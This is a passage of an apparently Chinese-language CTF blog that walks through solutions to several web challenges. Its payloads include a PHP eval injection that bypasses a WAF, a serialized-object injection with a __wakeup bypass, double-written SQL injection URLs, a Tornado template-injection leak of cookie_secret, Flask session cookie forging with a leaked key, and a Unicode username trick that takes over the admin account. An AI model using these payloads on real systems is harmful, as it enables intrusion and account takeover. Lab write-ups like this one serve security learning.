do?&quot;</span>);<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以看到如果我们传入<code>num</code>的话，根本就不会执行我们希望执行的eval函数，这个时候可以利用PHP解析的特性</p><p>构造<code>? num=phpinfo()</code>这时，就会绕过WAF和isset的判断。这样实际上 服务器自己接收的是 <code> num</code> 而自己处理的数据是 <code>num</code> 这里有一个空格的区别</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201091634769.png" alt="image-20220109163404711"></p><p>可以看到phpinfo内很多命令执行的函数被禁用，但是没有禁用诸如 var_dump,scan_dir,next,highlight_file 这类可以对文件扫描读取的函数</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201091635556.png" alt="image-20220109163527463"></p><p>构建 <code>? num=var_dump(scandir(chr(47)))</code> 对根目录扫描 chr(47) &#x3D;&gt; ‘&#x2F;‘</p><p>最终payload <code>? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));</code></p><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>首页直接提示备份源码，<a href="http://www.zip/">www.zip</a> 找到源码</p><p>在index.php中发现</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>;<br>  <span class="hljs-variable">$select</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;select&#x27;</span>];<br>  <span class="hljs-variable">$res</span>=unserialize(@<span class="hljs-variable">$select</span>);<br>  <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>看来是反序列化 跟进class.php，得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><br>error_reporting(<span class="hljs-number">0</span>);<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;<br>            <span class="hljs-keyword">die</span>();          <br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>那我们只要让 usernmae&#x3D;admin,password&#x3D;100即可，构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>   <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;100&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<br>    &#125;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> Name(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-number">100</span>);<br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$a</span>));<br>    <span class="hljs-comment">//结果：O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D</span><br><span class="hljs-comment">//别忘了还有一个 __wakeup 这会影响到username ，可以修改 Name后的数值来绕过 CVE-2016-7124</span><br><span class="hljs-comment">//这个payload 就行 index.php?select=O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>经过测试过滤了很多sql函数，不能大写绕过，但是可以双写</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">http:</span>//<span class="hljs-number">160</span>d<span class="hljs-number">7</span>b<span class="hljs-number">7</span><span class="hljs-keyword">c</span><span class="hljs-number">-1080</span><span class="hljs-number">-467</span>d<span class="hljs-number">-9261</span><span class="hljs-number">-01</span>cef<span class="hljs-number">19e14</span>f<span class="hljs-number">3</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/check.php?username<span class="hljs-operator">=</span><span class="hljs-number">1</span>admin&#x27; ununionion seselectlect <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span><br>group_concat(table_name)frfromom(infoorrmation_schema.tables)<br>whwhereere table_schema<span class="hljs-operator">=</span>database() <span class="hljs-variable">%23</span>&amp;password<span class="hljs-operator">=</span><span class="hljs-keyword">c</span><span class="hljs-number">7852e8</span><span class="hljs-keyword">c</span><span class="hljs-number">9</span>ffdf<span class="hljs-number">99e34</span>f<span class="hljs-number">06e3</span>cbc<span class="hljs-number">9</span>ebcb<span class="hljs-number">5</span><br>最终payload<br><span class="hljs-symbol">http:</span>//<span class="hljs-number">160</span>d<span class="hljs-number">7</span>b<span class="hljs-number">7</span><span class="hljs-keyword">c</span><span class="hljs-number">-1080</span><span class="hljs-number">-467</span>d<span class="hljs-number">-9261</span><span class="hljs-number">-01</span>cef<span class="hljs-number">19e14</span>f<span class="hljs-number">3</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/check.php?username<span class="hljs-operator">=</span>admin&amp;password<span class="hljs-operator">=</span>pwd <span class="hljs-variable">%27</span> ununionion seselectlect <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span><span class="hljs-punctuation">,</span>group_concat(flag)frfromom(ctf.Flag)<span class="hljs-variable">%23</span>&amp;password<span class="hljs-operator">=</span><span class="hljs-keyword">c</span><span class="hljs-number">7852e8</span><span class="hljs-keyword">c</span><span class="hljs-number">9</span>ffdf<span class="hljs-number">99e34</span>f<span class="hljs-number">06e3</span>cbc<span class="hljs-number">9</span>ebcb<span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>经过测试，备份文件名为 index.php.bak</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$key</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!is_numeric(<span class="hljs-variable">$key</span>)) &#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;Just num!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$key</span> = intval(<span class="hljs-variable">$key</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$key</span> == <span class="hljs-variable">$str</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Try to find out source file!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个地方，如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p><p>那么我们直接传入 ?key&#x3D;123 即可</p><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>看到一下信息</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs haml">-<span class="ruby">welcome.txt</span><br><span class="ruby"></span>render            #联想到ssti<br>-<span class="ruby">/flag <span class="hljs-comment">#</span></span><br><span class="ruby"></span>flag in /fllllllllllllag<br>-<span class="ruby">hints.txt</span><br><span class="ruby"></span>md5(cookie_secret+md5(filename))  getflag方法<br></code></pre></td></tr></table></figure><p>利用</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">/error?msg=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">handler.settings</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>获取cookie_secret</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-built_in">hash</span> = hashlib.md5()<br><br>filename=<span class="hljs-string">&#x27;/fllllllllllllag&#x27;</span><br>cookie_secret=<span class="hljs-string">&quot;02b76ca5-817f-4887-baf1-a6c7556d97a5&quot;</span><br><span class="hljs-built_in">hash</span>.update(filename.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>s1=<span class="hljs-built_in">hash</span>.hexdigest()<br><span class="hljs-built_in">hash</span> = hashlib.md5()<br><span class="hljs-built_in">hash</span>.update((cookie_secret+s1).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hash</span>.hexdigest())<br><br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201091801316.png" alt="image-20220109180135246"></p><p>最后传入，获取flag 唉 这题好也不好 相关参数都没说明 参与感有点弱 知识点倒是不难</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">/file?filename<span class="hljs-operator">=</span>/fllllllllllllag&amp;filehash<span class="hljs-operator">=</span><span class="hljs-number">36</span>f<span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-number">34</span>a<span class="hljs-number">3</span>b<span class="hljs-number">5</span>f<span class="hljs-number">640</span>a<span class="hljs-number">3</span>be<span class="hljs-number">9</span><span class="hljs-keyword">c</span><span class="hljs-number">664536</span><span class="hljs-keyword">c</span><span class="hljs-number">8e81</span><br></code></pre></td></tr></table></figure><h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>可以很容易联想到 这一定会和修改HTTP数据包有关</p><p>在MENU下拉菜单里，发现了 pay.php</p><p>得到 hints</p><blockquote><p>If you want to buy the FLAG:<br>You must be a student from CUIT!!!<br>You must be answer the correct password!!!</p><p>FLAG NEED YOUR 100000000 MONEY</p></blockquote><p>源码中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>~~~post money <span class="hljs-keyword">and</span> password~~~<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><span class="hljs-keyword">if</span> (is_numeric(<span class="hljs-variable">$password</span>)) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;<br>&#125;<span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$password</span> == <span class="hljs-number">404</span>) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Password Right!&lt;/br&gt;&quot;</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>有几个注意的点 上面这个php源码 考察php弱类型 我们让404a 和 404相比就可以通过</p><p>然后 money&#x3D;100000000 但是 服务器接受不了这个数据 我们换成 1e10</p><p>同时在cookie中存在 user字段 把他修改成 1 就好(明显标志身份的变量非0即1)  数据包如下</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/pay.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>89518f98-3169-46aa-bae2-dc44032958d7.node4.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>24<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://89518f98-3169-46aa-bae2-dc44032958d7.node4.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Edg/96.0.1054.29<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://89518f98-3169-46aa-bae2-dc44032958d7.node4.buuoj.cn:81/pay.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>UM_distinctid=17ce3948a50a00-06fd4863146224-561a135a-144000-17ce3948a51bb6; user=1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="apache"><span class="hljs-attribute">password</span>=<span class="hljs-number">404</span>a&amp;money=<span class="hljs-number">1</span>e<span class="hljs-number">10</span></span><br></code></pre></td></tr></table></figure><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>没思路… ，看了看有三种解法</p><h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h3><p>u:admin p:123</p><h3 id="Flask伪造session"><a href="#Flask伪造session" class="headerlink" title="Flask伪造session"></a>Flask伪造session</h3><p>怎么知道的是Flask，在用户登入之后 页面源代码给了git地址</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ui grid&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;four wide column&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;eight wide column&quot;</span>&gt;</span><br>        <span class="hljs-comment">&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ui form segment&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;field required&quot;</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>NewPassword<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;newpassword&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;newpassword&quot;</span> <span class="hljs-attr">required</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ui button fluid&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;更换密码&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>  <br></code></pre></td></tr></table></figure><p>跟进github地址 进行源码审计</p><p><code>app/config.py</code> 发现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Config</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    SECRET_KEY = os.environ.get(<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;ckj123&#x27;</span><br>    SQLALCHEMY_DATABASE_URI = <span class="hljs-string">&#x27;mysql+pymysql://root:adsl1234@db:3306/test&#x27;</span><br>    SQLALCHEMY_TRACK_MODIFICATIONS = <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p>先对session进行解密</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python .\flask_session_cookie_manager3.py decode -c .eJw90MGKwjAQBuBXWebsodH0UvBg6TasMAmV1DC5iK61NTYuVKW24rtv1gWPwz_zMTMP2By66tJAcu1u1QQ2xz0kD_jYQQLoUq-M9TI7MRzX3nrkaHIvHY7KlFPMlg2ZcqCxdUrT3RrsSZex1TVTGnsci9BfRla3Dg1xHBsnBQ7yb1YvHU4puBShWwzk9k4amlmdNyjy1opVq4T05GmGAu_BYyhWHkNNjrjSi5hcPZOiiDAr5vCcwPelO2yuP6fq_D4hrMqsod5mspEmkNknD-txFAWzWdrK8YuRX3slysCcuBK5w37-4o5-W1dvqRJxSsV_ct76EACDCdwuVff6GbAInr89XGmn.YdrY7g.FrFc4vSZxr6D-SNKQFbbl0mkZWw<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201092047501.png" alt="image-20220109204748408"></p><p>name字段是刚刚登陆的用户名 目标是让他变成admin</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python .\flask_session_cookie_manager3.py encode -s &quot;ckj123&quot; -t &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;20f9ff49535ffc81af6339e602aae2c9c961ec0a59e859303481e4e9c1f838c4c25e612c3f5364202b7c5f7e1a0aedde8cfbf70c19350df2f7b68909b874d404&#x27;, &#x27;csrf_token&#x27;: b&#x27;635ef0d3a5de818e880d5d0e725bef8e40988ac3&#x27;, &#x27;image&#x27;: b&#x27;xnAa&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot;<br></code></pre></td></tr></table></figure><p>之后用我们得到的 session对原session进行替换即可</p><h3 id="Unicode欺骗"><a href="#Unicode欺骗" class="headerlink" title="Unicode欺骗"></a>Unicode欺骗</h3><p>比较经典但是不太容易想到的洞，在下面这个网站搜特定字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">https://unicode-table.com/en/search/?q=admin<br></code></pre></td></tr></table></figure><p>组成 ᴬᴰᴹᴵᴺ 注册一个账号 然后修改密码 即可修改 admin的密码</p><p>在注册的时候 ”ᴬᴰᴹᴵᴺ“ 经过strlower()，转成”ADMIN“ ， 在修改密码的时候 ”ADMIN“经过strlower()变成”admin“ </p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201092120281.png" alt="image-20220109212015184"></p><p>实际利用思路是这样 注册 ᴬᴰᴹᴵᴺ 经过一次 strlower &#x3D;&gt; ADMIN  然后修改密码触发change函数内的strlower ADMIN &#x3D;&gt; admin</p><p>这样实际上修改的就是admin的密码了</p><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>考察了三个MD5的点</p><h3 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h3><p>一进环境，就一个框框，没啥思路，然后我curl了一下。在数据包中发现了这个Hint</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">RawContent        : HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OK<br>                    Transfer-<span class="hljs-keyword">Encoding</span>: chunked<br>                    <span class="hljs-keyword">Connection</span>: keep-alive<br>                    Hint: <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">password</span>=md5($pass,<span class="hljs-keyword">true</span>)<br>                    Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/html; charset=UTF<span class="hljs-number">-8</span><br>                    <span class="hljs-type">Date</span>: Mon, <span class="hljs-number">10</span> Jan <span class="hljs-number">2022</span> <span class="hljs-number">11</span>:<span class="hljs-number">14</span>:<span class="hljs-number">22.</span>..<br></code></pre></td></tr></table></figure><p>思路比较固定 <code>select * from &#39;admin&#39; where password=md5($pass,true)</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span 